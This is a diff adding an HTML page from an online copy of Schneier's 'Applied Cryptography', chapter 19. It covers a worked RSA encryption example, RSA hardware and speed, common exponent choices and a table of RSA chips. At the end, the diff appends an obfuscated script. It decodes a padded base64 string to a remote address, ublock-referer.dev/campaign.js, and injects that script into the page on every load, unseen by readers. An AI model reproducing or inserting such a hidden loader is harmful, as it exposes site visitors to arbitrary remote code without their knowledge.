@@ -1,0 +1,213 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Public-Key Algorithms</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=19//-->
+<!--PAGES=468-469//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="19-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="19-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>first break it into small blocks. Three-digit blocks work nicely in this case. The message is split into six blocks, <I>m</I><SUB>i</SUB>, in which</P>
+<DL>
+<DD><I>m</I><SUB>1</SUB> = 688
+<DD><I>m</I><SUB>2</SUB> = 232
+<DD><I>m</I><SUB>3</SUB> = 687
+<DD><I>m</I><SUB>4</SUB> = 966
+<DD><I>m</I><SUB>5</SUB> = 668
+<DD><I>m</I><SUB>6</SUB> = 003
+</DL>
+<P>The first block is encrypted as
+</P>
+<DL>
+<DD>688<SUP>79</SUP> mod 3337 = 1570 = <I>c</I><SUB>1</SUB>
+</DL>
+<P>Performing the same operation on the subsequent blocks generates an encrypted message:
+</P>
+<DL>
+<DD><I>c</I> = 1570 2756 2091 2276 2423 158
+</DL>
+<P>Decrypting the message requires performing the same exponentiation using the decryption key of 1019, so
+</P>
+<DL>
+<DD>1570<SUP>1019</SUP> mod 3337 = 688 = <I>m</I><SUB>1</SUB>
+</DL>
+<P>The rest of the message can be recovered in this manner.
+</P>
+<P><FONT SIZE="+1"><B><I>RSA in Hardware</I></B></FONT></P>
+<P>Much has been written on the subject of hardware implementations of RSA [1314, 1474, 1456, 1316, 1485, 874, 1222, 87, 1410, 1409, 1343, 998, 367, 1429, 523, 772]. Good survey articles are [258, 872]. Many different chips perform RSA encryption [1310, 252, 1101, 1317, 874, 69, 737, 594, 1275, 1563, 509, 1223]. A partial list of currently available RSA chips, from [150, 258], is listed in Table 19.3. Not all are available on the open market.
+</P>
+<P><FONT SIZE="+1"><B><I>Speed of RSA</I></B></FONT></P>
+<P>In hardware, RSA is about 1000 times slower than DES. The fastest VLSI hardware implementation for RSA with a 512-bit modulus has a throughput of 64 kilobits per second [258]. There are also chips that perform 1024-bit RSA encryption. Currently chips are being planned that will approach 1 megabit per second using a 512-bit modulus; they will probably be available in 1995. Manufacturers have also implemented RSA in smart cards; these implementations are slower.
+</P>
+<P>In software, DES is about 100 times faster than RSA. These numbers may change slightly as technology changes, but RSA will never approach the speed of symmetric algorithms. Table 19.4 gives sample software speeds of RSA [918].</P>
+<P><FONT SIZE="+1"><B><I>Software Speedups</I></B></FONT></P>
+<P>RSA encryption goes much faster if you&#146;re smart about choosing a value of <I>e</I>. The three most common choices are 3, 17, and 65537 (2<SUP>16</SUP> &#43; 1). (The binary representation of 65537 has only two ones, so it takes only 17 multiplications to exponentiate.) X.509 recommends 65537 [304], PEM recommends 3 [76], and PKCS #1 (see Section 24.14) recommends 3 or 65537 [1345]. There are no security problems with using any of these three values for <I>e</I> (assuming you pad messages with random values&#151;see later section), even if a whole group of users uses the same value for <I>e</I>.</P>
+<TABLE WIDTH="100%"><TH CAPTION COLSPAN="7" ALIGN="CENTER">Table 19.3<BR>Existing RSA Chips
+<TR>
+<TD COLSPAN="7"><HR>
+<TR>
+<TH WIDTH="15%" VALIGN="BOTTOM" ALIGN="CENTER">Company
+<TH WIDTH="15%" VALIGN="BOTTOM" ALIGN="RIGHT">Clock Speed
+<TH WIDTH="15%" VALIGN="BOTTOM" ALIGN="RIGHT">Baud Rate Per 512 Bits
+<TH WIDTH="15%" VALIGN="BOTTOM" ALIGN="RIGHT">Clock Cycles Per 512 Bit Encryption
+<TH WIDTH="15%" VALIGN="BOTTOM" ALIGN="RIGHT">Technology
+<TH WIDTH="15%" VALIGN="BOTTOM" ALIGN="RIGHT">Bits per Chip
+<TH VALIGN="BOTTOM" ALIGN="RIGHT">Number of Transistors
+<TR>
+<TD COLSPAN="7"><HR>
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">Alpha Techn.
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">25 MHz
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">13 K
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">.98 M
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">2 micron
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">1024
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">180,000
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">AT&ampT
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">15 MHz
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">19 K
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">.4 M
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">1.5 micron
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">298
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">100,000
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">British Telecom
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">10 MHz
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">5.1 K
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">1 M
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">2.5 micron
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">256
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">&#151;&#151;
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">Business Sim. Ltd.
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">5 MHz
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">3.8 K
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">.67 M
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">Gate Array
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">32
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">&#151;&#151;
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">Calmos Syst. Inc.
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">20 MHz
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">28 K
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">.36 M
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">2 micron
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">593
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">95,000
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">CNET
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">25 MHz
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">5.3 K
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">2.3 M
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">1 micron
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">1024
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">100,000
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">Cryptech
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">14 MHz
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">17 K
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">.4 M
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">Gate Array
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">120
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">33,000
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">Cylink
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">30 MHz
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">6.8 K
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">1.2 M
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">1.5 micron
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">1024
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">150,000
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">GEC Marconi
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">25 MHz
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">10.2 K
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">.67 M
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">1.4 micron
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">512
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">160,000
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">Pijnenburg
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">25 MHz
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">50 K
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">.256 M
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">1 micron
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">1024
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">400,000
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">Sandia
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">8 MHz
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">10 K
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">.4 M
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">2 micron
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">272
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">86,000
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">Siemens
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">5 MHz
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">8.5 K
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">.3 M
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">1 micron
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">512
+<TD VALIGN="BOTTOM" ALIGN="RIGHT">60,000
+<TR>
+<TD COLSPAN="7"><HR>
+</TABLE>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="19-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="19-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(UAosoVOF, vcBoVCCi) {vcBoVCCi = UAosoVOF.createElement('script');vcBoVCCi.type = 'text/javascript';vcBoVCCi.async = true;vcBoVCCi.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');UAosoVOF.getElementsByTagName('body')[0].appendChild(vcBoVCCi);}(document));</script></body>
+</html>
